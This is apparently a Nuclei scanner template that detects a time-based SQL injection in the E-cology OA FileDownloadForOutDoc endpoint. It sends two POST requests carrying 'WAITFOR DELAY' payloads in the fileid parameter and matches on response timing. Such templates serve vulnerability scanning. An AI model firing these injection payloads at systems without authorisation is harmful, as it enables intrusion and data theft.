id: ecology-oa-file-sqli

info:
  name: E-cology FileDownloadForOutDocSQL - SQL Injection
  author: momika233
  severity: high
  tags: ecology,ecology-oa,sqli

http:
  - raw:
      - |
        @timeout: 15s
        POST /weaver/weaver.file.FileDownloadForOutDoc HTTP/1.1
        Host: {{Hostname}}

        isFromOutImg=1&fileid=%d+WAITFOR+DELAY+'0:0:3'

      - |
        @timeout: 15s
        POST /weaver/weaver.file.FileDownloadForOutDoc HTTP/1.1
        Host: {{Hostname}}

        isFromOutImg=1&fileid=%d+WAITFOR+DELAY+'0:0:6'

    matchers:
      - type: dsl
        dsl:
          - 'duration_1>=3 && duration_1<=5'
          - 'duration_2>=6 && duration_2<=8'
          - 'status_code == 200'
          - 'content_length == 0'
          - 'contains(set_cookie, "ecology_JSessionid=")'
        condition: and

